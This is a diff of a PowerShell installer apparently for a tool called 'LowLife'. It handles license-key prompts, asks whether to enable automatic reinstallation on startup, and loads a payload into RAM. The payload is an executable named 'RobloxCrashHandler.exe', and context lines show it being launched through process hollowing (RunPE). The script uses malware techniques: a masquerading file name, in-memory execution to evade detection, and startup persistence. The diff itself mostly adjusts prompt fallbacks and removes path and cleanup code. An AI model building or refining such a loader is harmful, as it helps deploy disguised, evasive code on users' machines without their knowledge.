@@ -82,7 +82,6 @@ if ($Key) {
 
 if (-not $licenseKey) {
     $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
-    if ($resolvedPath -match '(?i)\\system32') { $resolvedPath = $env:TEMP }
     $keyFile = Join-Path $resolvedPath "key.txt"
     if (Test-Path $keyFile) {
         $licenseKey = (Get-Content $keyFile -Raw).Trim()
@@ -100,15 +99,37 @@ if (-not $licenseKey) {
             $licenseKey = $prompt.Trim()
         }
     } catch {
-        $licenseKey = (Read-Host "Enter your LowLife license key").Trim()
+        # VisualBasic prompt failed, check if we can show Forms InputBox or fallback to console Read-Host
+        try {
+            Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
+            # Note: Systems.Windows.Forms doesn't have an built-in input dialog, but we can try to fall back safely
+            throw "Forms fallback"
+        } catch {
+            if ($Host.Name -eq "ConsoleHost" -and -not $Silent) {
+                $licenseKey = (Read-Host "Enter your LowLife license key").Trim()
+            } else {
+                Write-Error "Key prompt failed in non-interactive environment."
+                Exit 1
+            }
+        }
     }
     if ([string]::IsNullOrWhiteSpace($licenseKey)) { Write-Error "Key cannot be empty."; Exit }
 }
 
 # Persistence prompt
 if (-not $Silent -and -not $Persist) {
-    Write-Host ""
-    if ((Read-Host "Enable automatic reinstallation on startup? [Y/N]") -match "^[yY]") { $Persist = $true }
+    try {
+        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
+        $boxResult = [System.Windows.Forms.MessageBox]::Show("Enable automatic reinstallation on startup?", "LowLife Persistence Option", [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question)
+        if ($boxResult -eq [System.Windows.Forms.DialogResult]::Yes) {
+            $Persist = $true
+        }
+    } catch {
+        if ($Host.Name -eq "ConsoleHost") {
+            Write-Host ""
+            if ((Read-Host "Enable automatic reinstallation on startup? [Y/N]") -match "^[yY]") { $Persist = $true }
+        }
+    }
 }
 
 # Save key, workspace path, and server URL to registry
@@ -427,7 +448,6 @@ Write-Host "[2/4] Loading payload into RAM..." -ForegroundColor Yellow
 
 $exeBytes = $null
 $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
-if ($resolvedPath -match '(?i)\\system32') { $resolvedPath = $env:TEMP }
 $localExe = Join-Path $resolvedPath "build\RobloxCrashHandler.exe"
 $localServerExe = Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"
 
@@ -471,13 +491,6 @@ Write-Host "[3/4] Launching loader in-memory (process hollowing)..." -Foreground
 # Remove old file-based install folder if it exists (legacy cleanup)
 $oldFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
 if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
-# Clean up legacy AppData configuration folders for all user profiles
-Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue |
-    Where-Object { $_.Name -notmatch '(?i)^(Public|Default|All Users|Default User)$' } |
-    ForEach-Object {
-        $legacyPath = Join-Path $_.FullName "AppData\Roaming\LOWLIFE"
-        if (Test-Path $legacyPath) { Remove-Item $legacyPath -Recurse -Force -ErrorAction SilentlyContinue }
-    }
 
 $hollowSuccess = $false
 if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
